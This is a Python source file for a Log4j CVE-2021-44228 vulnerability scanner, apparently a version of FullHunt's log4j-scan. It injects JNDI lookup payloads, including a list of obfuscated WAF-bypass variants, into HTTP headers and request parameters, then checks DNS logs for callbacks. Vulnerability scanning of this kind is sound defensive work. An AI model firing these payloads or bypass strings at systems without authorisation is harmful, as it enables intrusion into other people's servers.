#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# log4j-scan: A generic scanner for Apache log4j RCE CVE-2021-44228
# Author:
# Mazin Ahmed <Mazin at FullHunt.io>
# Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
# Secure your Attack Surface with FullHunt.io.
# ******************************************************************

import argparse
import random
import requests
import time
import sys
import base64
import json
import random
from termcolor import cprint
from threading import Thread
from queue import Queue


class Worker(Thread):
    """ Thread executing tasks from a given tasks queue """

    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                # An exception happened in this thread
                print(e)
            finally:
                # Mark this task as done, whether an exception happened or not
                self.tasks.task_done()


class ThreadPool:
    """ Pool of threads consuming tasks from a queue """

    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        """ Add a task to the queue """
        self.tasks.put((func, args, kargs))

    def map(self, func, args_list):
        """ Add a list of tasks to the queue """
        for args in args_list:
            self.add_task(func, args)

    def wait_completion(self):
        """ Wait for completion of all the tasks in the queue """
        self.tasks.join()

# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
cprint('[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
cprint('[•] Secure your External Attack Surface with FullHunt.io.', "yellow")

if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)


default_headers = {
    'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
    # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
}
waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_domain}}/{{random}}}",
                       "${${::-j}ndi:rmi://{{callback_domain}}/{{random}}}",
                       "${jndi:rmi://{{callback_domain}}}",
                       "${${lower:jndi}:${lower:rmi}://{{callback_domain}}/{{random}}}",
                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_domain}}/{{random}}}",
                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_domain}}/{{random}}}",
                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_domain}}/{{random}}}",
                       "${jndi:dns://{{callback_domain}}}"]

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-p", "--proxy",
                    dest="proxy",
                    help="send requests through proxy",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs.",
                    action='store')
parser.add_argument("--request-type",
                    dest="request_type",
                    help="Request Type: (get, post) - [Default: get].",
                    default="get",
                    action='store')
parser.add_argument("--timeout",
                    dest="timeout",
                    help="Request timeout - [Default: 1].",
                    default=1,
                    type=int,
                    action='store')
parser.add_argument("--headers-file",
                    dest="headers_file",
                    help="Headers fuzzing list - [default: headers.txt].",
                    default="headers.txt",
                    action='store')
parser.add_argument("--run-all-tests",
                    dest="run_all_tests",
                    help="Run all available tests on each URL.",
                    action='store_true')
parser.add_argument("--exclude-user-agent-fuzzing",
                    dest="exclude_user_agent_fuzzing",
                    help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
                    action='store_true')
parser.add_argument("--wait-time",
                    dest="wait_time",
                    help="Wait time after all URLs are processed (in seconds) - [Default: 2].",
                    default=2,
                    type=int,
                    action='store')
parser.add_argument("--waf-bypass",
                    dest="waf_bypass_payloads",
                    help="Extend scans with WAF bypass payloads.",
                    action='store_true')
parser.add_argument("--verbose",
                    dest="verbose",
                    help="Enable verbose logging.",
                    action='store_true')
parser.add_argument("--skip-callback",
                    dest="skip_callback",
                    help="Skip DNS callback check.",
                    action='store_true')
parser.add_argument("--callback-domain",
                    dest="callback_domain",
                    help="Callback domain [Default: example.com].",
                    default="example.com",
                    action='store')
parser.add_argument("--dns-logs-path",
                    dest="dns_logs_path",
                    help="DNS logs path [Default: /data/dns.log].",
                    default="/data/dns.log",
                    action='store')
parser.add_argument("--parameter-names",
                    dest="parameter_names",
                    help="Comma separated additional parameter names.",
                    action='store')

args = parser.parse_args()

parameter_names = ["username", "user", "email", "email_address", "password"]

if args.parameter_names:
    parameter_names += args.parameter_names.split(",")

def get_fuzzing_headers():
    fuzzing_headers = []
    with open(args.headers_file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            fuzzing_headers.append(i)
    return fuzzing_headers


def gen_fuzzing_header(header, payload):
    if args.exclude_user_agent_fuzzing:
        return default_headers["User-Agent"]
    if header == "Referer":
        return f'https://{payload}'
    return payload


def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for i in parameter_names:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data


def generate_waf_bypass_payloads(callback_domain, random_string):
    payloads = []
    for i in waf_bypass_payloads:
        new_payload = i.replace("{{callback_domain}}", callback_domain)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads


def check_logs(path, tokens):
    with open(path, "r") as logs:
        l = logs.read()
        for t in tokens:
            if t in l:
                return True
    return False


def scan_url(url, callback_domain, proxies, timeout):
    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(16))
    payload_callback = "%s.%s" % (random_string, callback_domain)
    payload = '${jndi:ldap://%s/%s}' % (payload_callback, random_string)
    payloads = [payload]
    if args.waf_bypass_payloads:
        payloads.extend(generate_waf_bypass_payloads(payload_callback, random_string))
    resps = []
    resp_get = None
    resp_post = None
    try:
        resp_get = requests.request(url=url,
                                    method="GET",
                                    verify=False,
                                    timeout=timeout,
                                    proxies=proxies)
    except Exception as e:
        cprint(f"EXCEPTION: {e}")
    try:
        resp_post = requests.request(url=url,
                                    method="POST",
                                    verify=False,
                                    timeout=timeout,
                                    proxies=proxies)
    except Exception as e:
        cprint(f"EXCEPTION: {e}")
    if args.verbose:
        if resp_get is not None:
            cprint(f"[•] GET  URL redirected: {resp_get.url}", "magenta")
        if resp_post is not None:
            cprint(f"[•] POST URL redirected: {resp_post.url}", "magenta")
    def scan_target(fuzzing_header):
        if resp_get is not None or resp_post is not None:
            for payload in payloads:
                cprint(f"[•] URL: {url} | PAYLOAD: {payload} | Header: {fuzzing_header}", "cyan")
                if resp_get is not None and (args.request_type.upper() == "GET" or args.run_all_tests):
                    try:
                        requests.request(url=resp_get.url,
                                        method="GET",
                                        params={name: payload for name in parameter_names},
                                        headers={**default_headers, fuzzing_header: gen_fuzzing_header(fuzzing_header, payload)},
                                        verify=False,
                                        timeout=timeout,
                                        proxies=proxies)
                    except Exception as e:
                        cprint(f"EXCEPTION: {e}")

                if resp_post is not None and (args.request_type.upper() == "POST" or args.run_all_tests):
                    try:
                        # Post body
                        requests.request(url=resp_post.url,
                                        method="POST",
                                        headers={**default_headers, fuzzing_header: gen_fuzzing_header(fuzzing_header, payload)},
                                        data=get_fuzzing_post_data(payload),
                                        verify=False,
                                        timeout=timeout,
                                        proxies=proxies)
                    except Exception as e:
                        cprint(f"EXCEPTION: {e}")

                    try:
                        # JSON body
                        requests.request(url=resp_post.url,
                                        method="POST",
                                        headers={**default_headers, fuzzing_header: gen_fuzzing_header(fuzzing_header, payload)},
                                        json=get_fuzzing_post_data(payload),
                                        verify=False,
                                        timeout=timeout,
                                        proxies=proxies)
                    except Exception as e:
                        cprint(f"EXCEPTION: {e}")

    fuzzing_headers = get_fuzzing_headers()

    pool = ThreadPool(10)
    pool.map(scan_target, fuzzing_headers)
    pool.wait_completion()

    return random_string


def main():
    urls = []
    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)

    callback_domain = args.callback_domain

    cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
    for idx, url in enumerate(urls):
        cprint(f"[•] URL {idx}/{len(urls)}: {url}", "magenta")
        proxies = {}
        if args.proxy:
            proxies = {"http": args.proxy, "https": args.proxy}
        random_string = scan_url(url, callback_domain, proxies, args.timeout)

        if not args.skip_callback:
            cprint("[•] Payloads sent. Waiting for OOB callbacks.", "cyan")
            cprint("[•] Waiting...", "cyan")
            time.sleep(args.wait_time)

            if not check_logs(args.dns_logs_path, [random_string]):
                cprint("[•] Targets does not seem to be vulnerable.", "green")
            else:
                cprint(f"[!!!] Target Affected: {url}", "yellow")
        else:
            cprint("[•] Payloads sent. Waiting for OOB callbacks skipped.", "cyan")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
